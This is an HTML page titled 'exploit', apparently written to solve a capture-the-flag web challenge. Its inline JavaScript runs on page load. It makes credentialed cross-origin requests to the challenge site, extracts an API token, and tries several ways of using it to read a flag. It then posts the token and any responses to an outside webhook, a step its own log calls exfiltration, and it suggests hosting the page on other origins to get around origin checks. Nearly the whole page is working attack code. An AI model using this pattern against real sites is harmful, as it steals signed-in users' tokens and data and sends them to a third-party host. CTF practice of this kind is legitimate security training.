<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>exploit</title>
  <style>body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:1rem} pre{white-space:pre-wrap}</style>
</head>
<body>
  <h2>Exploit runner — logs below</h2>
  <p>Make sure you are already signed into <code>https://web200-1.pointeroverflowctf.com</code> in this browser/profile.</p>
  <pre id="out">starting…</pre>

<script>
(async () => {
  const outEl = document.getElementById('out');
  const log = (s) => { outEl.textContent += s + "\n"; console.log(s); };

  try {
    const TARGET = 'https://web200-1.pointeroverflowctf.com';
    const WEBHOOK = 'https://microscopic-lighter-07.webhook.cool'; // your webhook

    log('1) fetch /api/token (credentials included)');
    const tokRes = await fetch(TARGET + '/api/token', { credentials: 'include', method: 'GET', mode: 'cors' });
    log('  token fetch status: ' + tokRes.status);
    const tokText = await tokRes.text();
    log('  token response text: ' + tokText);

    let apiToken;
    try { apiToken = JSON.parse(tokText).apiToken; } catch (e) { /* ignore */ }
    if (!apiToken) {
      log('No apiToken found — aborting.');
      return;
    }
    log('  extracted apiToken: ' + apiToken);

    // helper to try one request and report
    async function tryReq(label, input) {
      log('---');
      log(label);
      let res, text;
      try {
        res = await fetch(input.url, input.init);
        log('  status: ' + res.status + ' (' + (res.statusText||'') + ')');
        // try reading text if possible
        try { text = await res.text(); } catch (e) { text = '[response body unreadable]'; }
        log('  text: ' + text);
      } catch (err) {
        log('  request error: ' + err);
        text = '[[error]] ' + err;
      }
      return { res, text };
    }

    // attempt 1: GET with X-Flag-Token
    await tryReq('Attempt A — GET with X-Flag-Token header', {
      url: TARGET + '/api/flag',
      init: {
        method: 'GET',
        credentials: 'include',
        mode: 'cors',
        headers: { 'X-Flag-Token': apiToken, 'Accept': 'application/json' }
      }
    });

    // attempt 2: POST with X-Flag-Token header (no body)
    await tryReq('Attempt B — POST with X-Flag-Token header', {
      url: TARGET + '/api/flag',
      init: {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: { 'X-Flag-Token': apiToken, 'Accept': 'application/json' }
      }
    });

    // attempt 3: POST JSON body { token: ... }
    await tryReq('Attempt C — POST JSON body {"token":...}', {
      url: TARGET + '/api/flag',
      init: {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ token: apiToken })
      }
    });

    // attempt 4: GET with query param ?token=...
    await tryReq('Attempt D — GET with ?token=...', {
      url: TARGET + '/api/flag?token=' + encodeURIComponent(apiToken),
      init: {
        method: 'GET',
        credentials: 'include',
        mode: 'cors',
        headers: { 'Accept': 'application/json' }
      }
    });

    // attempt 5: try a fetch that includes an extra header the server might want
    await tryReq('Attempt E — GET with X-Flag-Token and X-Requested-With', {
      url: TARGET + '/api/flag',
      init: {
        method: 'GET',
        credentials: 'include',
        mode: 'cors',
        headers: { 'X-Flag-Token': apiToken, 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json' }
      }
    });

    // After attempts, re-check the whole page for any non-404 / non-empty responses
    // If any response text looked interesting (not "Not found."), POST it to your webhook.
    // We will heuristically send any response that doesn't equal "Not found." and isn't empty.
    // For privacy: this posts only to your webhook configured above.
    async function exfilIfInteresting(bodyText, label) {
      if (!bodyText) return false;
      const trimmed = ('' + bodyText).trim();
      if (trimmed === '' || trimmed.toLowerCase() === 'not found.' || trimmed.toLowerCase().includes('404')) return false;
      log('==> Found interesting response for ' + label + ': ' + trimmed.slice(0,200));
      try {
        await fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            from: location.href,
            target: TARGET,
            methodTried: label,
            token: apiToken,
            response: trimmed,
            timestamp: new Date().toISOString()
          })
        });
        log('  exfiltration POST sent to webhook.');
      } catch (e) {
        log('  exfiltration failed: ' + e);
      }
      return true;
    }

    // Re-run the same requests but capturing their bodies for exfil test (we already logged above,
    // but to keep it simple we do one more targeted check to see if any could be read earlier).
    const checks = [
      { label:'A', url: TARGET + '/api/flag', init:{ method:'GET', credentials:'include', mode:'cors', headers:{'X-Flag-Token':apiToken} } },
      { label:'B', url: TARGET + '/api/flag', init:{ method:'POST', credentials:'include', mode:'cors', headers:{'X-Flag-Token':apiToken} } },
      { label:'C', url: TARGET + '/api/flag', init:{ method:'POST', credentials:'include', mode:'cors', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:apiToken}) } },
      { label:'D', url: TARGET + '/api/flag?token=' + encodeURIComponent(apiToken), init:{ method:'GET', credentials:'include', mode:'cors' } }
    ];

    for (const c of checks) {
      try {
        const r = await fetch(c.url, c.init);
        const t = await r.text().catch(()=>'[unreadable]');
        await exfilIfInteresting(t, c.label);
      } catch (e) {
        log('check ' + c.label + ' error: ' + e);
      }
    }

    log('done. Check your webhook for any posted results. If nothing returned, try hosting this same page on another secure origin (another GitHub Pages repo, GitLab Pages, or a personal HTTPS host) — the challenge hint suggests certain origins get special treatment.');
  } catch (err) {
    log('fatal error: ' + err);
  }
})();
</script>
</body>
</html>
